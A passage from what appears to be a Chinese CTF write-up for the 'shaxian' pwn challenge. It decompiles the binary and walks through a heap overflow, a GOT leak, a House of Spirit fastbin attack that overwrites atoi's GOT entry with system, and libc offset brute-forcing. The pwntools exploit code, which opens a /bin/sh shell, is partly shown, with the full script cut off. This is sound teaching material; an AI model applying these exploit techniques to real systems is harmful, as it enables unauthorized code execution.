class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到这是一个<code>菜单式</code>的交互程序。此程序的大致功能分为<code>5部分</code>：</p><blockquote><p>1、点菜。<br>2、提交订单。<br>3、索要收据。<br>4、查看购物车。<br>5、退出程序。</p></blockquote><p>&emsp;&emsp;在进入菜单前，程序会要求输入客户的信息：客户的<code>地址</code>和<code>电话</code>。这两个数据都存在<code>.bss段</code>上，大小均为<code>256字节</code>。</p><p>&emsp;&emsp;分析功能前，先看一下，用于存储订单信息的<code>购物车结构体</code>。此结构体拥有三个结构体成员。<code>count</code>：存储某种菜的数量。<code>food_type</code>：存储菜的名字。<code>next</code>：存储前一个购物车结构体的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 shopping_cart_struct struc ; (sizeof=0x28, mappedto_5)                                  </span><br><span class="line">00000000 count           dd ?</span><br><span class="line">00000004 food_type       db 32 dup(?)</span><br><span class="line">00000024 next            dd ?</span><br><span class="line">00000028 shopping_cart_struct ends</span><br></pre></td></tr></table></figure></p><p>1、<code>点菜</code>：通过一个购物车结构体(shopping_cart_struct)的<code>单链表</code>，将用户输入的<code>菜的类型</code>和<code>数量</code>数据存储在<code>堆</code>中。<code>.bss段</code>上的head_ptr_0804B1C0变量为此单链表的<code>头指针</code>，也是最后所点的菜的信息结构体指针。其中使用<code>input_message()函数</code>读入菜的名字，存入<code>food_type</code>成员变量中。input_message()函数有<code>四个参数</code>，分别表示：文件描述符，缓冲区地址，最大读取长度，读取终止符(\n)。我们知道<code>food_type</code>只有<code>32字节</code>大小，而这里input_message()函数却可以最大读入<code>60字节</code>数据，这会造成<code>next指针</code>被覆盖，形成<code>堆溢出</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Diancai</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_ptr; <span class="comment">// ebx</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"CHI SHEN ME?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Banmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Bianrou"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Qingtangmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Jianbao"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Jianjiao"</span>);</span><br><span class="line">  head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">  head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">  tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">  tmp_ptr-&gt;count = get_num();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add to GOUWUCHE"</span>);                      <span class="comment">// 购物车数量+1</span></span><br><span class="line">  <span class="keyword">return</span> shopping_cart++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">input_message</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> buf, <span class="keyword">int</span> max_len, <span class="keyword">int</span> Linefeed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; max_len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, (<span class="keyword">void</span> *)(i + buf), <span class="number">1u</span>) &lt;= <span class="number">0</span> ) <span class="comment">// 读取发生错误</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + buf) == (_BYTE)Linefeed )<span class="comment">// LF == 0xA,换行符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回正常读取的字节数</span></span><br><span class="line">  *(_BYTE *)(i + buf) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2、<code>提交订单</code>：打印购物车中的订单信息，并将堆上用于存储菜的类型和数量数据的<code>堆块</code>进行<code>释放</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Submit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *free_ptr; <span class="comment">// ST1C_4</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( !shopping_cart )                         <span class="comment">// 购物车为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"DIANCAI first"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    print_food_list(tmp_head_ptr);</span><br><span class="line">    free_ptr = tmp_head_ptr;</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(free_ptr);                             <span class="comment">// 释放结构体内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Your order has been submitted!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3、<code>索要收据</code>：输入收据抬头信息。抬头信息也存储于<code>.bss段</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Receipt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Taitou:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Title, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Taitou saved"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4、<code>查看购物车</code>：通过购物车结构体(shopping_cart_struct)的<code>单链表</code>，<code>循环</code>将购物车中的订单内容打印出来。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Review</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">      tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address:%s\n"</span>, &amp;Address_buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Phone:%s\n"</span>, &amp;Phone_number_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Title:%s\n"</span>, &amp;Title);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;由于程序是<code>堆溢出</code>，而且大小是<code>40+8</code>(presize+size)，因此可以利用<code>fastbin</code>结构进行堆块的利用。<code>泄露信息部分</code>较为简单，因为结构体中自带了<code>next指针</code>，这个地方是可以覆盖的，所以直接覆盖后，在<code>打印信息</code>的时候就可以泄露相关的<code>got表信息</code>。打印信息部分如下所示：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>地址写</code>的逻辑主要是通过<code>fastbin</code>来修改<code>head指针</code>，在<code>head_ptr_0804B1C0</code>处伪造一个假的堆块<code>fake_chunk</code>，修改<code>next指针</code>指向该fake_chunk，然后通过<code>free</code>成功释放掉该fake_chunk。<code>再次申请</code>时，该fake_chunk将被分配，并且刚好能实现4字节<code>任意地址</code>写<code>任意数据</code>(将atoi_got改写为system)，所以下次输入编号的时候，直接输入“/bin/sh”即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line"><span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">tmp_ptr-&gt;count = get_num();</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;然而本题的考点主要在于，<code>libc</code>是主办方<code>自己编译</code>的，网上无法查到，所以其偏移带有特殊性。这里必须通过某种方法对其进行泄露，由于这里是堆中，修改的信息十分有限，不像栈那样简单。因此此题可以使用<code>两种方法</code>来求解。</p><h3 id="0x20-方法一：对libc库中的函数偏移进行爆破。"><a href="#0x20-方法一：对libc库中的函数偏移进行爆破。" class="headerlink" title="0x20 方法一：对libc库中的函数偏移进行爆破。"></a>0x20 方法一：对libc库中的函数偏移进行爆破。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、根据经验，<code>system地址</code>与<code>atoi地址</code>相距并不远(atoi在libc中的偏移是小于system的)，而且这些<code>库函数的地址</code>大都比较规整，为<code>0x10</code>的整数倍，于是可以通过<code>暴力破解</code>得到system的地址。为了<code>防止卡死</code>，我们通过发送<code>&quot;cat /home/ctf/flag&quot;</code>命令，作为system的参数，让远程服务器执行，通过<code>返回的结果</code>来判断是否正确执行，从而判断是否得到system函数与atoi函数的偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.writeline(<span class="string">'/bin/cat /home/*/Desktop/flag'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">data = io.recv(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;虽然偏移不会很大，但是为了节省时间，我们可以<code>分段</code>进行<code>暴力破解</code>。如：分别从0x0，0x5000，0xA000，0xD000的距离开始破解。</p><p>2、点菜时，我们通过输入<code>food_type</code>将其后面的的<code>next指针</code>覆盖为<code>atoi_got-0x4</code>，因为<code>next指针</code>指向的是结构体中的<code>count成员</code>，而它的大小为<code>0x4字节</code>。所以，通过<code>Review</code>查看的时候，会通过[next]-&gt;food_type将<code>atoi_got</code>的内容输出出来。我们就得到了<code>atoi的地址</code>。加上<code>dis</code>(system与atoi的偏移)，就可以得到<code>system的地址</code>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">dian_cai(io,payload,<span class="number">2</span>) <span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">atoi_addr = leak_atoi_addr(io)</span><br></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">  tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、因为每次点菜时，分配的堆块大小为<code>0x30字节</code>，处于<code>fastbin范围</code>之内(16byte - 64byte)，所以，我们可以使用Fastbin相关漏洞利用技术进行攻击。再次点菜时，我们使用<code>Fastbin Attack</code>中的<code>House of Spirit</code>类型漏洞利用技术，并将<code>next指针</code>覆盖为<code>head_ptr_0804B1C0 - 0x8</code>。在此之前，我们已经将<code>head_ptr_0804B1C0</code>周围的内存区域构造成了一个<code>fake_chunk</code>，输入<code>Phone_number</code>和<code>Address</code>时，我们分别构造了<code>fake_chunk</code>的chunk_header和fake_chunk相邻的<code>下一chunk</code>的chunk_header。构造的目的是绕过<code>Free函数</code>中的一些检测，使fake_chunk成功放入<code>fastbin链表</code>中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span>*<span class="number">244</span> + p32(<span class="number">0x31</span>))</span><br><span class="line">......</span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">dian_cai(io,payload1,<span class="number">3</span>)<span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br></pre></td></tr></table></figure></p><p>4、接下来，我们再通过Submit()函数中的<code>Free()函数</code>，将此fake_chunk释放入<code>fastbin链表</code>中。由于fake_chunk是<code>最后一个</code>释放的chunk，所以排在<code>fastbin链表</code>的<code>头部</code>。下次调用<code>malloc()函数</code>分配堆块时，就会<code>分配</code>到这个fake_chunk，从而可以<code>更改</code>fake_chunk的内容。若我们将<code>head_ptr的内容</code>修改为<code>atoi_got</code>，输入count时，将system的地址填入，就将<code>system地址</code>写到了<code>atoi_got</code>。下次调用atoi()函数时，输入“/bin/sh”，就相当于调用了<code>system(&quot;/bin/sh&quot;)</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 执行完Submit()</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x804b1b0 —▸ 0x804c060 ◂— 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将system地址写入atoi的got表中</span></span><br><span class="line">system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line"><span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">dian_cai(io,payload2,system_addr) <span class="comment"># 0x804b1b8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于我们输入的<code>count</code>是以<code>字符串形式</code>输入的，之后会经过<code>atoi()函数</code>，将我们的输入转化为<code>整数</code>，存储于count中。我们得到的<code>system()函数地址</code>是<code>16进制形式</code>的字符串，所以我们需要将system()函数的地址值转化为<code>有符号10进制字符串</code>输入(count为int型)，才能使count中保存的是我们所需要的system()函数的地址。</p><p><strong><code>完整exp</code></strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct,time</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">            bp 0x08048B31</span></span><br><span class="line"><span class="string">            bp 0x08048912</span></span><br><span class="line"><span class="string">            bp 0x08048B8E</span></span><br><span class="line"><span class="string">            bp 0x080489F6</span></span><br><span class="line"><span class="string">            bp 0x08048B95'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,gdbscript = gdbscript)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_info</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(<span 